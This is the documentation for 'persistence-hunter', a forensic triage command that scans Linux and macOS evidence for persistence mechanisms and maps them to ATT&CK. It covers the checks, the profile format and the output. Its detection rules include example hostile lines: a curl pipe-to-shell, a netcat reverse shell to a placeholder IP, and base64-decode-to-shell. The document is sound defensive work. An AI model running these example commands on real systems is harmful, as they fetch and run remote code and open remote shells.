# persistence-hunter

`persistence-hunter` parses the persistence artifacts of a Linux or macOS collection, runs a
fixed set of checks over each parsed record, and writes one row per finding. Each check is a
heuristic. A finding is a lead to review, not a verdict. A run with no findings does not prove
that a host has no persistence; it means no check matched the records the parsers read. The
command has no rule language: each check is a Rust function in the `CHECKS` table, and a YAML
profile can only allow or block by text and by check id.

## Usage

```
nixcavate persistence-hunter (-d <DIR> | -f <FILE>) [-o <FILE>] [--profile <FILE>] [OPTIONS]
```

Options of the command:

| Flag | Meaning | Default |
|---|---|---|
| `-d, --directory <DIR>` | Evidence directory: a collection, a mounted volume, or a folder of collections and archives. Required unless `-f` is given; conflicts with `-f` | none |
| `-f, --file <FILE>` | Evidence archive (`.tar`, `.tar.gz`, `.tar.zst`, `.tar.xz`, `.zip`). Conflicts with `-d` | none |
| `-o, --output <FILE>` | Output file. An existing file is an error unless `-C` is given | stdout |
| `--profile <FILE>` | YAML profile with `allow` and `block` entries | no profile |
| `--min-severity <SEVERITY>` | Leave out findings below this severity: `info`, `low`, `medium` or `high` | `info` |
| `--show-allowed` | Keep allowed findings in the output, with status `allowed` | off |

Shared options of the commands that parse evidence:

| Flag | Meaning | Default |
|---|---|---|
| `-t, --type <TYPE>` | Output type: `csv`, `json` or `jsonl` | `csv` |
| `-T, --threads <N>` | Worker threads | logical CPUs |
| `-C, --clobber` | Replace an existing `-o` file | off |
| `-q, --quiet` | Do not print the stderr summary. `failed:` lines are still printed | off |
| `-K, --no-color` | Accepted. The hunt summary is not colored, so it has no effect | off |
| `--max-expansion <RATIO>` | How many times the compressed size an archive may expand to before a task stops. `0` for no limit | `100` |
| `--zoneinfo <DIR>` | Zone database used when the evidence names the host zone but lacks its data | `/usr/share/zoneinfo` |

Examples:

```
# Archive to stdout as CSV, medium severity and above
nixcavate persistence-hunter -f collection.tar.gz --min-severity medium

# Directory, with an allow profile, as JSON Lines to a file
nixcavate persistence-hunter -d ./evidence --profile corp-allow.yaml -t jsonl -o hunt.jsonl

# Replace an earlier output file and keep allowed rows visible
nixcavate persistence-hunter -d ./evidence -t json -o hunt.json -C --show-allowed
```

The planted fixtures in `test_files/persistence-hunter/macos` give a small known result:
`nixcavate persistence-hunter -d test_files/persistence-hunter/macos` writes 9 findings.

## How it works

1. **Parse.** The evidence is read by the same parser code as `auto-parse`, restricted to the 21
   artifacts that appear in `CHECKS`: `anacron`, `at-jobs`, `authorized-keys`, `btm`, `cron`,
   `cron-scripts`, `emond`, `init-d`, `kernel-extensions`, `launchd`, `ld-preload`,
   `modules-load`, `pam`, `passwd`, `rc-local`, `shadow`, `shell-profiles`, `sudoers`,
   `systemd-units`, `udev-rules` and `xdg-autostart`. Each parser writes JSONL to a private
   scratch directory, which is removed when the run ends.
2. **Check each record.** A record is run through every check whose `artifact` equals the
   record's artifact. A check that returns a reason produces a row with status `finding`.
   When several checks match one record, a check is dropped if another check that matched the
   same record has the same ATT&CK technique and a higher severity. For example, a cron record
   that matches `cron-suspicious-command` (high) and `cron-reboot-job` (low), both T1053.003,
   produces only the high row. Checks of equal severity on one technique are all kept.
3. **Apply block rules.** If the profile has `block` entries, every record is tested. Each
   block entry whose `contains` text appears in a string value of the record produces a row
   with check `block-rule`, severity `high` and status `blocked`. Block rows are not subject to
   the rule in step 2.
4. **Apply allow rules.** For each row, the first `allow` entry whose keys all match sets the
   status to `allowed` and copies its `reason`. Allow entries also apply to block rows.
5. **Filter and sort.** Rows below `--min-severity` are dropped. Allowed rows are dropped unless
   `--show-allowed` is given. Rows are sorted by host, then severity (high first), check id,
   `source_path`, `source_line` and `source_offset`, all ascending. A missing line or offset
   sorts first.
6. **Write.** Rows go to stdout or to `-o` in the chosen type. Unless `-q` is given, a summary
   goes to stderr. Each failed parser task is reported on stderr as
   `failed: <artifact> <input>: <error>`. Records that a failed task had already written are
   still checked. The exit code is set as described under Output.

## Checks

`CHECKS` has 34 rows: 20 for Linux artifacts, 8 for macOS artifacts, and 6 for artifacts read
on both systems (`ANY_OS`). Two check ids appear twice with different artifacts and techniques:
`cron-script-writable` (cron scripts and init scripts) and `launchd-suspicious-program`
(LaunchAgents and LaunchDaemons). Each row is listed once below, under the OS of its artifact.
Severity is shown as it appears in the output.

### Linux (20 rows)

| Check id | Severity | ATT&CK | What it flags |
|---|---|---|---|
| `at-job` | low | T1053.002 | Any queued `at` job |
| `at-job-suspicious` | high | T1053.002 | `at` job command with a suspicious-command match |
| `anacron-suspicious-command` | high | T1053.003 | anacron job command with a suspicious-command match |
| `systemd-suspicious-exec` | high | T1543.002 | `Exec*` line of a unit (ExecStart, ExecStartPre, ExecStartPost, ExecStop, ExecReload) with a suspicious-command match |
| `systemd-user-unit` | low | T1543.002 | Unit file under a `home/`, `root/` or `Users/` path |
| `systemd-ld-preload` | high | T1574.006 | Unit `Environment` sets `LD_PRELOAD=` |
| `rc-local-command` | low | T1037.004 | Any `rc.local` line other than `exit 0` |
| `rc-local-suspicious` | high | T1037.004 | `rc.local` line with a suspicious-command match |
| `ld-preload-entry` | high | T1574.006 | Library listed in `/etc/ld.so.preload` |
| `ld-library-path-writable` | high | T1574.006 | Linker search path in `ld.so.conf` data that is in a temporary directory |
| `udev-run-suspicious` | high | T1546.017 | udev rule command with a suspicious-command match |
| `modprobe-install-command` | medium | T1547.006 | `install` directive that runs a command, other than `true`, `false` or an unchained `/sbin/modprobe --ignore-install` |
| `pam-exec-module` | medium | T1556.003 | `pam_exec.so` in a PAM service line (not `@include`) |
| `pam-module-unusual-path` | high | T1556.003 | PAM module given by absolute path outside `/lib`, `/lib64`, `/usr/lib`, `/usr/lib64`, `/usr/lib32` and `/lib32` |
| `xdg-autostart-suspicious` | high | T1547.013 | Autostart `Exec` line with a suspicious-command match |
| `passwd-extra-uid0` | high | T1136.001 | Account other than `root` with uid 0 |
| `passwd-password-in-passwd` | medium | T1078.003 | Password field in `/etc/passwd` that is not `x`, `*` or `!` (including empty) |
| `shadow-passwordless` | high | T1078.003 | Account that can log in without a password |
| `sudoers-nopasswd-all` | medium | T1548.003 | sudo rule with `NOPASSWD` and `ALL` commands |
| `cron-script-writable` | medium | T1037.004 | Init script (`init.d`) that is group- or world-writable, or not owned by root |

### macOS (8 rows)

| Check id | Severity | ATT&CK | What it flags |
|---|---|---|---|
| `launchd-suspicious-program` | high | T1543.001 | LaunchAgent whose command matches a suspicious-command rule, or that runs `curl` |
| `launchd-suspicious-program` | high | T1543.004 | LaunchDaemon whose command matches a suspicious-command rule, or that runs `curl` |
| `launchd-apple-label-outside-system` | medium | T1036.004 | `com.apple.` label in a plist outside `System/Library/`, except a user agent that runs a binary under `/System/` or `/usr/` |
| `launchd-user-agent-persistent` | low | T1543.001 | User agent that runs at load or is kept alive, and starts a program outside `/Applications/`, `/System/`, `/Library/` and `/usr/` |
| `launchd-dyld-insert` | high | T1574.006 | Job sets `DYLD_INSERT_LIBRARIES` |
| `emond-rule-command` | high | T1546.014 | Enabled Event Monitor rule with a command |
| `kext-third-party` | low | T1547.006 | Any kernel extension record |
| `btm-item-unsigned` | low | T1547.015 | Background item with no team ID and a developer name that is empty or `Unknown Developer`, outside `/System/` |

### Both systems (6 rows)

| Check id | Severity | ATT&CK | What it flags |
|---|---|---|---|
| `cron-suspicious-command` | high | T1053.003 | Crontab command with a suspicious-command match |
| `cron-reboot-job` | low | T1053.003 | Crontab entry with schedule `@reboot` |
| `cron-script-writable` | medium | T1053.003 | Script in a `cron.*` or periodic directory that is group- or world-writable, or not owned by root |
| `shell-profile-suspicious` | medium | T1546.004 | Startup-file line with a suspicious-command match, or that sets `LD_PRELOAD=`, `PROMPT_COMMAND=`, `alias sudo=` or `alias su=`. Comment lines are skipped |
| `authorized-key-forced-command` | medium | T1098.004 | `authorized_keys` entry with a forced command |
| `authorized-key-root` | low | T1098.004 | SSH key authorized for `root` |

Total: 20 + 8 + 6 = 34 rows.

## What counts as a suspicious command

Several checks call `suspicious_command` on a command line. Before the rules run, the line is
read as a shell reads it:

- A `#` that starts a word begins a comment, which is removed.
- Quotes are removed. `${IFS}` and `$IFS` are read as spaces, and newlines as `;`.
- Brace lists are expanded, so `{echo,hi}` is `echo hi`.
- The line is split at `;`, `|`, `&`, `(` and `)`, except in redirections such as `2>&1`.
- Assignments and wrapper commands (`sudo`, `doas`, `env`, `nohup`, `timeout`, `exec` and
  similar) are skipped to find the command word.
- `sh -c "..."` (and the other shells, and `bash`) is split so that the string is read as a
  command of its own.

The rules are checked in the order below. The first rule that matches gives the reason. The
detail of the row is `<reason>: <command>`.

| Reason | Matches when | Example that matches |
|---|---|---|
| runs from a world-writable or temporary directory | A command word or interpreter script is under `/tmp`, `/var/tmp`, `/dev/shm`, `/private/tmp`, `/private/var/tmp` or `/users/shared` (any case), or under a macOS per-user `/var/folders/*/*/T`. A `./` file runs after `cd` into one of these | `/tmp/.x/payload --daemon` |
| runs from a hidden path | A command word or interpreter script has a path part that starts with `.` followed by a letter, digit or `_`, unless the name is on a fixed list of ordinary names (for example `.ssh`, `.config`, `.cache`, `.cargo`, `.oh-my-zsh`, `.well-known`) | `~/.hidden/agent --quiet` |
| downloads and executes code | `curl` or `wget` piped into a shell or interpreter; or a file that `curl` or `wget` saved is later made executable with `chmod` or run; or the output of `curl` or `wget` is given through `$(...)` or `<(...)` to a shell, `eval`, `source` or `.` | `curl -fsSL http://203.0.113.5/i.sh \| sh` |
| decodes an encoded payload | `base64` with `-d`, `-D` or `--decode`; `openssl enc` with `-d` and `base64` or `enc`; `xxd -r` | `echo aGk= \| base64 -d \| sh` |
| inline interpreter with network or encoded code | `python*`, `perl`, `ruby` or `node` with `-c` or `-e`, or `php` with `-r`, where the code contains `socket`, `/dev/tcp/`, `pty.spawn`, `urlopen`, `b64decode`, `base64`, `fromhex` or `decompress` | `python3 -c 'import socket,os;s=socket.socket()'` |
| reverse-shell tooling | `nc`, `ncat` or `netcat` with an exec option (`-e`, `-c`, `--exec`, `--sh-exec`, `--lua-exec`); `mkfifo` with netcat; `socat` with `EXEC:`; `/dev/tcp/` or `/dev/udp/` anywhere in the line | `nc -e /bin/sh 203.0.113.5 4444` |
| runs AppleScript from the command line | `osascript` with `-e` or `-l` | `osascript -e 'do shell script "id"'` |

Ordinary lines that the rules deliberately do not flag. Each is from the benign test table:

| Command line | Why it is not flagged |
|---|---|
| `find /var/tmp -type f -mtime +7 -delete` | A temporary path is an argument, not the command |
| `rm -rf /tmp/build-cache` | Same |
| `curl -fsS https://example.com/health > /var/lib/app/health` | Download without execution |
| `curl -s https://example.com/api \| jq .` | Pipe into a command that is not a shell or interpreter |
| `curl https://example.com/.well-known/security.txt` | `.well-known` is on the list of ordinary hidden names |
| `[ -f ~/.bash_aliases ] && . ~/.bash_aliases` | A dotfile is sourced, not run. Only command words and interpreter scripts count |
| `source ~/.iterm2_shell_integration.zsh` | Same |
| `cd / && ./run.sh` | A relative run is flagged only after `cd` into a temporary directory |
| `VAR=$(curl -s https://example.com/api)` | Assignment, not execution |
| `curl -s -o /var/lib/app/f.json https://example.com/f; chmod 600 /var/lib/app/f.json` | `chmod` without an executable bit |
| `python3 -c 'print(1)'` | Inline code with no network or encoded content |
| `base64 /etc/hostname` | Encoding, not decoding |
| `# curl http://203.0.113.9/x \| sh and /tmp/x` | Comment, removed before the rules run |
| `HISTFILE=${ZDOTDIR:-$HOME}/.zsh_history` | Stock shell startup line |
| `test -x /usr/sbin/anacron \|\| ( cd / && run-parts --report /etc/cron.daily )` | Stock cron line |
| `/usr/bin/timeout 5 /usr/lib/x86_64-linux-gnu/e2fsprogs/e2scrub_all_cron` | Wrapper with a duration; system path |

An empty line and `exit 0` are not flagged either.

## Profile

A profile is a YAML file with two optional keys, `allow` and `block`. Unknown keys are errors.
The example below is valid for the profile structs in `hunt.rs`:

```yaml
# Allowed rows are hidden unless --show-allowed is given. The first matching entry wins.
allow:
  # Every key present must match. Glob patterns: * is any run of characters, ? is one.
  - check: systemd-*
    path: etc/systemd/system/updater.service
    reason: Corporate update agent
  # contains matches the row's detail or the text of what the record runs, not the whole record.
  - contains: /usr/local/bin/startup-check
    host: build-*
    reason: Site startup check
  # One key is enough when a whole check is accepted on a set of hosts.
  - check: authorized-key-root
    host: backup-*
    reason: Backup host manages root keys by policy

# Matched against every string value in each record. Blocked rows are flagged even when no
# check matches the record.
block:
  - contains: backup.sh --target
    title: Known bad backup script
    technique: T1105
```

### Allow entries

| Key | Meaning | Matched against |
|---|---|---|
| `check` | Glob on the check id | The row's check id. Block rows have check id `block-rule` |
| `host` | Glob on the host name | The record's `host` |
| `path` | Glob on the source path | The row's `source_path` |
| `contains` | Case-sensitive substring | The row's `detail`, or the executable text of the record. Executable text is the values of `command`, `program`, `program_arguments`, `arguments`, `exec`, `exec_start`, `exec_start_pre`, `exec_start_post`, `exec_stop`, `exec_reload`, `text`, `path`, `executable`, `executable_path`, `forced_command` and `module`. Other fields are not searched. For a block row the detail is ``record contains `...` ``, so the entry's text can match there too |
| `reason` | Text copied to the `reason` column of the matched row | Not matched |

Glob rules: `*` matches any run of characters, including `/`; `?` matches one character;
matching is case-sensitive and must cover the whole value.

### Block entries

| Key | Meaning | Matched against |
|---|---|---|
| `contains` | Required. Case-sensitive substring | Every string value in the parsed record, including `host` and `source_path`. Keys are not searched |
| `title` | Title of the row | Not matched. Default `Matches a block rule` |
| `technique` | ATT&CK technique of the row | Not matched. Default empty |

Each block entry that matches gives its own row. A block row has severity `high` and an empty
tactic.

### Validation

All of these are usage errors: the command prints `nixcavate: profile <path>: ...` on stderr,
writes nothing to stdout, and exits 2.

| Condition | Result |
|---|---|
| Top-level key other than `allow` or `block` | Error. The message names the key |
| Key other than the ones listed above, in an entry | Error. The message names the key |
| Not valid YAML, or the wrong shape (for example `allow: yes`) | Error |
| `allow` or `block` present with no value | No entries |
| Allow entry with none of `check`, `host`, `path`, `contains` (a key with no value counts as absent) | Error: `needs one of check, host, path, contains`. This includes an entry that has only `reason` |
| Allow selector set to an empty string | Error: `has an empty selector`. An empty selector would match every finding |
| Block entry with `contains` missing or empty | Error |
| Profile file cannot be read | Error |

An empty or whitespace-only file is read as a profile with no entries.

## Output

Columns, in order. The same names are used as CSV header cells and as JSON keys:

| Column | Meaning |
|---|---|
| `host` | Host name of the record |
| `severity` | `info`, `low`, `medium` or `high` |
| `check` | Check id, or `block-rule` |
| `technique` | ATT&CK technique ID. Empty for a block row with no `technique` |
| `tactic` | ATT&CK tactic, such as `Persistence`. Empty for a block row |
| `title` | Check title, or the block entry's `title` |
| `status` | `finding`, `blocked` or `allowed`. See below |
| `detail` | Why the record matched: the reason from the check, or ``record contains `...` `` for a block row. Control characters are written as escapes; tab is kept |
| `artifact` | Artifact id of the record |
| `source_path` | Input path, relative to the host root |
| `source_line` | 1-based line of the record, or empty when the record has none |
| `source_offset` | Byte offset of the record in the decompressed input, or empty |
| `evidence` | The whole parsed record as compact JSON text. In JSON and JSONL it is a string that holds JSON, not a nested object |
| `reason` | The `reason` of the allow entry that matched, or empty |

`status` values:

| Value | Meaning |
|---|---|
| `finding` | A check matched, and no allow entry matched |
| `blocked` | A block entry matched, and no allow entry matched |
| `allowed` | An allow entry matched. These rows appear only with `--show-allowed` |

Formats:

- **CSV** (default): a header row, then one row per finding. RFC 4180 quoting. An absent value
  is an empty cell.
- **JSON**: one array per run. An absent value is `null`.
- **JSONL**: one object per line, with keys in column order. An absent value is `null`.

With no findings, CSV has only the header row, JSON is `[]`, and JSONL is empty.

Sort order: host (ascending), then severity (high first), check id, `source_path`,
`source_line`, `source_offset`. See step 5 under How it works.

Summary on stderr, unless `-q` is given. Counts cover the rows written, so they follow
`--min-severity` and `--show-allowed`. The `allowed` count is zero unless `--show-allowed` is
given. For the macOS fixture:

```
persistence-hunter: 9 findings (5 high, 1 medium, 3 low, 0 info), 0 allowed
  top checks: launchd-suspicious-program x3, btm-item-unsigned x1, emond-rule-command x1, kext-third-party x1, launchd-apple-label-outside-system x1
```

The second line lists up to five check ids of the non-allowed rows, most rows first, then by
check id. It is omitted when there are no rows.

Exit codes:

| Code | Meaning |
|---|---|
| 0 | The run completed; every parser task succeeded or was skipped |
| 1 | The run completed; at least one parser task failed. Its findings are still written |
| 2 | The run could not start or finish: bad arguments, a profile error, unreadable or missing evidence, an existing `-o` file without `-C`, or a write error. Clap usage errors also exit 2 |

## Limits

- The checks are heuristics for triage. They look at parsed fields and simple text rules, so a
  missed finding is possible, and a finding does not show that the item was used.
- Only the 21 artifacts listed under How it works are parsed. Records that a parser cannot read
  produce no rows, and a failed parser task sets exit code 1.
- The checks are compiled Rust functions. A new check needs a code change; a profile cannot add
  one.
- Ownership checks are not meaningful in directory mode. `cron-script-writable` tests the owner
  uid of each file. Files extracted by a non-root user belong to that user, so the owner part of
  the check fires for every script. The test suite excludes this check from directory runs for
  that reason. Use `-f` with an archive to keep the owners recorded in the archive.
- systemd: each unit file is checked on its own. A `.timer` record carries the `Unit=` it starts
  in its own field, and no check follows that link. A timer is therefore not joined to the
  service it starts. A service is flagged on its own record, if it is in the evidence.
- systemd: enablement is recorded as symlinks (`*.wants/`, `*.requires/`, masks to `/dev/null`),
  and these links are not parsed. A unit is flagged whether or not it is enabled. The `[Install]`
  section describes what enabling would do, not whether it is enabled. `.target` units are left
  out.
- `kext-third-party` matches every kernel extension record. The artifact is described as
  third-party extensions, and the check does not test the vendor. System extensions are not
  checked.
- `btm` key names come from a macOS 26 store layout, and the parser matches them tolerantly.
  Items in other layouts may not be read at all.
- `emond` rules are deprecated. The parser reads them where they are still present, and the
  `emond-rule-command` check covers those rules only.
- The launchd `keep_alive` test reads the value only as text: a `KeepAlive` that is not text
  does not make `launchd-user-agent-persistent` match. `run_at_load` must be a boolean `true`.
- Findings carry no timestamps. Time values of the records appear only inside `evidence`.
- Block entries apply only to records of the 21 artifacts above, because other artifacts are
  not parsed.
- Allow entries match text in the fields listed under `contains`. A value planted in another
  field, such as a log path, does not allow a finding.
- `-K` is accepted and has no effect on this command.
